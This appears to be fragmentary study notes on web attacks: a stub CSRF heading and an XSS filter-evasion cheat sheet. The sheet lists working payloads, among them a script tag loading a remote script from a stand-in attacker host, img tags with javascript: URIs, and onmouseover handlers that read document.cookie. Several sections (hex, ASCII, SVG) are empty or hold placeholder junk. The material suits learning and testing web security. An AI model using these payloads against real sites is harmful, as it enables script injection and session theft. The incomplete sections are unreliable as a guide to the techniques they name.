Cross-site Request Forgery (CSRF)

unauthorized commands from a trusted user...


Evading techniques 

Non-obfuscated Xss string
<SCRIPT SRC=http://malicious.h4cker.org/xss.js></SCRIPT>

<h2>Using HTML <img> for evasion</h2>

<img src="javascript:alert('xss');">
<img src=javascript:alert('xss')>
<img src="javascript:alert(&quot;XSS&quot;)>
<img src="javascript:alert('xss')>


<h2> Using malformed HTML tags </h2>

<a onmouseover="alert(document.cookie)"> This is a malicious link</a>
<a onmouseover=alert(document.cookie)> This is a malicious link</a>

<h2>Using hex HTML characters</h2>
<img src=afanfbefabefba>


<h2>Using ASCII encoding</h2>

<h2>Embedding SVG files to include XSS</h2>

<EMBED SRC=""></EMBED>

